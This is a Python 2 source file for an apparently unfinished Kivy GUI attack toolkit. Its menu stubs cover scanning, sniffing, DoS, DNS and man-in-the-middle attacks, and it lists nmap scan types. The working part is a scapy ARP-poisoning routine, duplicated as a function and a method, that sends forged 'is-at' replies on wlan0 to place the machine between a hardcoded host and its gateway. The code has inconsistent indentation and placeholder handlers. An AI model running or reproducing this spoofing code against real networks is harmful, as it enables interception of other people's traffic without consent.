
from kivy.uix.dropdown import DropDown
from kivy.core.window import Window
from kivy.graphics import *
from kivy.uix.textinput import TextInput
from kivy.app import App
from kivy.uix.floatlayout import *
from kivy.uix.boxlayout import *
from kivy.uix.dropdown import DropDown
from kivy.uix.button import Button
from kivy.core.text import *
from kivy.core.text.markup import *
from kivy.properties import *
from kivy.uix.label import Label
from kivy.uix.popup import Popup
from kivy.uix.colorpicker import *
from kivy.uix.tabbedpanel import TabbedPanel
import os
Window.clearcolor=(1,1,1,3)

s=DropDown()
#arp
#!/usr/bin/python
import sys
from scapy.all import sniff, sendp, ARP, Ether
router_ip=0

#scan_types=['Syn Scan', 'X-mas Scan', 'NUll Scan', 'Idle Scan']

def arp_poison_callback(packet):
	b=BoxLayout()
	global router_ip
	# Got ARP request?
	answer = Ether(dst=packet[ARP].hwsrc) / ARP()
	#print (packet[ARP].pdst + "\n"+ "src is " + packet[ARP].psrc + "\n")
	
	if packet[ARP].op == 1 and str(packet[ARP].psrc)==str('192.168.100.5') and str(packet[ARP].pdst)=='192.168.100.1':
		
		answer = Ether(dst=packet[ARP].hwsrc) / ARP()
		answer[ARP].op = "is-at"
		answer[ARP].hwdst = packet[ARP].hwsrc
		answer[ARP].psrc = packet[ARP].pdst
		answer[ARP].pdst = packet[ARP].psrc
		router_ip=packet[ARP].pdst
		txt1="Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
		print txt1
		b.add_widget(Label(text=txt1, pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
		sendp(answer, iface='wlan0')
		
	if packet[ARP].op == 1 and (router_ip):
		if(str(packet[ARP].psrc) ==router_ip and str(packet[ARP].pdst)==str('192.168.100.5')):			
			device_b = Ether(dst=packet[ARP].hwsrc) / ARP()
			device_b[ARP].op = "is-at"
			device_b[ARP].hwdst = packet[ARP].hwsrc
			device_b[ARP].psrc = packet[ARP].pdst
			device_b[ARP].pdst = packet[ARP].psrc
			txt2="Now Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
			print txt2
			b.add_widget(Label(text=txt2, pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
			sendp(device_b, iface='wlan0')	
	


#end of arp spoofing
class notepadApp(App):
    scan_types=['Syn Scan -sS', 'TCP connect scan -sT', 'UDP scan -sU', 'SCTP INIT scan', 
	'Intense Scan', 'Null Scan -sN ', 'Fin Scan -sF', 'Xmas Scan -sX', '(TCP ACK scan -sA',
	'FTP bounce scan -sb', 'IP protocol scan -so', 'idle scan -sI', 'CTP COOKIE ECHO scan ',
	'TCP Maimon scan -sM', 'TCP Window scan -sM']
    def __init__(self):
        App.__init__(self)
        
    def build(self):
        return MainWindow()

class OpenDialog(FloatLayout):

    open_file = ObjectProperty(None)
    cancel  = ObjectProperty(None)

class SaveDialog(FloatLayout):

    save_file = ObjectProperty(None)
    cancel  = ObjectProperty(None)

class MainWindow(BoxLayout):
    Color(0.7,0.5,0.4)
    """open_button = ObjectProperty()
    save_button = ObjectProperty()
    save_as_button = ObjectProperty()
    cut_button = ObjectProperty()
    copy_button = ObjectProperty()
    paste_button = ObjectProperty()
    delete_button = ObjectProperty()
    text_view = ObjectProperty()"""
    

    
    def __init__(self, **kwargs):

        super(MainWindow, self).__init__()
        self.clipboard_text = ""
        self.filepath = ""
        
    def scanner(self, *args):

        content = Label(text='nnnn')
        self._popup = Popup(title="Scanner",content=content,
                            size_hint=(0.9,0.9))
        self._popup.open()

    def open_file(self,path,filename):
        
        self.filepath = filename[0]
        f = open(self.filepath,'r')
        s = f.read()
        self.text_view.text = s
        f.close()
        self.cancel_dialog()
        
    def cancel_dialog(self):
        self._popup.dismiss()
        
    def Sniffer(self, *args):
	content = self.sniff_window()
        self._popup = Popup(title="Dos",content=content,size_hint=(0.9,0.9))
        self._popup.open()

            
    def DOS(self, *args):
        content = Label(text = "Kivy: Interactive Appsand Games in Python\nRoberto Ulloa, PacktPublishing")
        self._popup = Popup(title="Dos",content=content,
                            size_hint=(0.9,0.9))
        self._popup.open()

    def save_as_file(self, path,filename):
	content = Label(text = "Man In the Middle Attacks")
        self._popup = Popup(title="Dos",content=content,size_hint=(0.9,0.9))
        self._popup.open()
        
    def on_copy(self, *args):
	return


    def DNS(self, *args):
	content = Label(text = "DNS")
        self._popup = Popup(title="Dos",content=content,size_hint=(0.9,0.9))
        self._popup.open()

    def Mitm(self, *args):
	content = self.Mitm_window()
        self._popup = Popup(title="Mitm",content=content,size_hint=(0.9,0.9))
        self._popup.open()

       

    def Help(self, *args):

     	content = Label(text = "Help message on how to use the tool")
        self._popup = Popup(title="Dos",content=content,size_hint=(0.9,0.9))

        self._popup.open()
    def sniff_window(self):
		b=BoxLayout()
		b.add_widget(Label(text='Enter the Interface', pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
		b.add_widget(TextInput(multiline=False, pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
		return b
    def Mitm_window(self):
		self.b=BoxLayout()
		self.b.add_widget(Label(text='Enter the Interface', pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
		self.b.add_widget(TextInput(multiline=False, pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
		btn1=Button(text='Start', pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1))
		btn1.bind(on_release=lambda x:self.arp_spoof('intface'))
		self.b.add_widget(btn1)
	
		return self.b
    def arp_poison_callback(self, packet):
        b=BoxLayout()
        global router_ip
        # Got ARP request?
        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
        #print (packet[ARP].pdst + "\n"+ "src is " + packet[ARP].psrc + "\n")
	
        if packet[ARP].op == 1 and str(packet[ARP].psrc)==str('192.168.100.5') and str(packet[ARP].pdst)=='192.168.100.1':
			answer = Ether(dst=packet[ARP].hwsrc) / ARP()
			answer[ARP].op = "is-at"
			answer[ARP].hwdst = packet[ARP].hwsrc
			answer[ARP].psrc = packet[ARP].pdst
			answer[ARP].pdst = packet[ARP].psrc
			router_ip=packet[ARP].pdst
			txt1="Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
			print txt1
			#b.add_widget(Label(text=txt1, pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
			sendp(answer, iface='wlan0')
		
        if packet[ARP].op == 1 and (router_ip):
            if(str(packet[ARP].psrc) ==router_ip and str(packet[ARP].pdst)==str('192.168.100.5')):			
				device_b = Ether(dst=packet[ARP].hwsrc) / ARP()
				device_b[ARP].op = "is-at"
				device_b[ARP].hwdst = packet[ARP].hwsrc
				device_b[ARP].psrc = packet[ARP].pdst
				device_b[ARP].pdst = packet[ARP].psrc
				txt2="Now Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
				print txt2
				#b.add_widget(Label(text=txt2, pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
				sendp(device_b, iface='wlan0')	

        return b
    def arp_spoof(self, intf):
		
		sniff(count=20, prn=arp_poison_callback,filter="arp",iface='wlan0',store=0)
		b=BoxLayout()
		#txt2="Now Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
		#txt1="Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
		b.add_widget(Label(text="txt1", pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
		b.add_widget(Label(text="txt2", pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))

		return b
class ComboEdit(TextInput):

    options = ListProperty(('', ))

    def __init__(self, **kw):
        ddn = self.drop_down = DropDown()
        ddn.bind(on_select=self.on_select)
        super(ComboEdit, self).__init__(**kw)

    def on_options(self, instance, value):
        ddn = self.drop_down
        ddn.clear_widgets()
        for widg in value:
            widg.bind(on_release=lambda btn: ddn.select(btn.text))
            ddn.add_widget(widg)

    def on_select(self, *args):
        self.text = args[1]


    def on_touch_up(self, touch):
        if touch.grab_current == self:
            self.drop_down.open(self)
        return super(ComboEdit, self).on_touch_up(touch)

class Nmap_output(TabbedPanel):
    pass

if __name__ == '__main__':
    
    notepadApp().run()





